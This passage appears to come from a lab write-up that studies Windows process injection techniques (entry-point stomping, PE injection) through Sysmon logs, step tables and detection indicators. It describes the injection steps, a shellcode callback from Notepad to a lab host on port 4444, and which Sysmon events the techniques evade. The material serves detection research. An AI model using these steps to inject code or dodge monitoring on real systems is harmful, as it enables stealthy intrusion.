CallTrace: C:\WINDOWS\SYSTEM32\ntdll.dll+1636b4|C:\WINDOWS\System32\KERNELBASE.dll+8b82d|C:\WINDOWS\System32\KERNELBASE.dll+88d43|C:\WINDOWS\System32\KERNELBASE.dll+888a6|C:\WINDOWS\System32\KERNEL32.DLL+44f14|C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2604.5.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe+1623ec|C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2604.5.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe+1623ec
SourceUser: WIN11\jens
TargetUser: WIN11\jens"

5. "Network connection detected:
RuleName: technique_id=T1571,technique_name=Non-Standard Port
UtcTime: 2026-05-26 07:36:35.828
ProcessGuid: {ED9BFE1B-4A3A-6A15-C801-000000001700}
ProcessId: 12916
Image: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2604.5.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
User: WIN11\jens
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 192.168.32.13
SourceHostname: -
SourcePort: 50818
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 192.168.32.49
DestinationHostname: -
DestinationPort: 4444
DestinationPortName: -"

### Sysmon Analysis 
EID 8 StartModule shows Notepad.exe confirming shellcode executes from within the named process binary and not anonymous memory. Most notable finding is EID 10 CallTrace showing Notepad.exe instead of UNKNOWN.
| Step | Action                                    | Sysmon EID | Rule Triggered          |
|------|-------------------------------------------|------------|-------------------------|
| 1    | Injector opens handle to Notepad          | EID 10     | update rule name        |
| 2    | PEB read to get image base                | -          | -                       |
| 3    | PE headers read to find entry point       | -          | -                       |
| 4    | VirtualProtectEx changes EP to RWX        | -          | -                       |
| 5    | Shellcode written to entry point          | -          | -                       |
| 6    | CreateRemoteThread at entry point         | EID 8      | T1055 Process Injection |
| 7    | Shellcode opens handle to cmd.exe         | EID 10     | ProcessInjectionDelux   |

### Key Indicators
- **EID 8** `StartModule: Notepad.exe` thread starts from named process binary not anonymous memory.
- **EID 8** `StartFunction: -` entry point has no named function because shellcode overwrote it. Named module with no function name is a stomping indicator.
- **EID 10** `CallTrace: Notepad.exe+1623ec` — shellcode calling APIs from within the named module. No UNKNOWN appears anywhere in the call chain.
- **EID 25 absent** VirtualProtectEx changing existing memory protection did not trigger image tamper notification. Same gap as T10 module stomping, Sysmon EID 25 only catches image replacement not protection changes.


## T.14 PE Injection
Maps a full portable executable into a remote process and executes a specific function within it. Unlike DLL injection which uses LoadLibraryA, PE injection manually copies the PE image, applies base relocations, then executes a chosen function via CreateRemoteThread. Print showing the injector executed its function InjectionEntryPoint and printed out the name of a module the code was running from.
<img width="495" height="221" alt="image" src="https://github.com/user-attachments/assets/29e5a3e3-df7c-4353-bc27-fd836ec130cf" />

| API Call                | Layer | Sysmon Event |
|-------------------------|-------|--------------|
| OpenProcess()           | Win32 | EID 10       |
| VirtualAllocEx()        | Win32 | -            |
| WriteProcessMemory()    | Win32 | -            |
| CreateRemoteThread()    | Win32 | EID 8        |

### Sysmon Data
1. "Process accessed:
RuleName: -
UtcTime: 2026-05-26 08:21:54.165
SourceProcessGUID: {ED9BFE1B-5822-6A15-5202-000000001700}
SourceProcessId: 12116
SourceThreadId: 13016
SourceImage: C:\Users\jens\Documents\procInj\t14_pe_injection.exe
TargetProcessGUID: {ED9BFE1B-581E-6A15-5102-000000001700}
TargetProcessId: 2100
TargetImage: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2604.5.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
GrantedAccess: 0x1fffff
CallTrace: C:\WINDOWS\SYSTEM32\ntdll.dll+162164|C:\WINDOWS\System32\KERNELBASE.dll+360c6|C:\Users\jens\Documents\procInj\t14_pe_injection.exe+16f6|C:\Users\jens\Documents\procInj\t14_pe_injection.exe+10d9|C:\Users\jens\Documents\procInj\t14_pe_injection.exe+1456|C:\WINDOWS\System32\KERNEL32.DLL+2e957|C:\WINDOWS\SYSTEM32\ntdll.dll+427c
SourceUser: WIN11\jens
TargetUser: WIN11\jens"

2. "CreateRemoteThread detected:
RuleName: technique_id=T1055,technique_name=Process Injection
UtcTime: 2026-05-26 08:21:54.169
SourceProcessGuid: {ED9BFE1B-5822-6A15-5202-000000001700}
SourceProcessId: 12116
SourceImage: C:\Users\jens\Documents\procInj\t14_pe_injection.exe
TargetProcessGuid: {ED9BFE1B-581E-6A15-5102-000000001700}
TargetProcessId: 2100
TargetImage: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2604.5.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
NewThreadId: 1192
StartAddress: 0x0000026A5B94156D
StartModule: -
StartFunction: -
SourceUser: WIN11\jens
TargetUser: WIN11\jens"

### Sysmon Analysis
Code spanws MessageBox instead of reverse shell so only two events generated,  EID 10 and EID 8. No EID 1 because MessageBox does not spawn child process. 
| Step | Action                                    | Sysmon EID | Rule Triggered          |
|------|-------------------------------------------|------------|-------------------------|
| 1    | Injector opens handle to Notepad          | EID 10     | no rule name yet        |
| 2    | PE headers copied to local buffer         | -          | -                       |
| 3    | Base relocations applied                  | -          | -                       |
| 4    | Relocated PE written to remote memory     | -          | -                       |
| 5    | CreateRemoteThread at injection entry     | EID 8      | T1055 Process Injection |
| 6    | MessageBox displayed in notepad context   | -          | -      |

### Key Indicators
- **EID 8** `StartModule: -` PE mapped into anonymous RWX memory.
  Manual mapping bypasses Windows loader.
  - **EID 8** `StartFunction: -` no named function at mapped address.
  Injector calculates delta between local and remote addresses and
  adds it to InjectionEntryPoint,  no symbol information available.
- **EID 7 absent** Windows loader never called. Manual PE mapping
  bypasses PsSetLoadImageNotifyRoutine entirely.
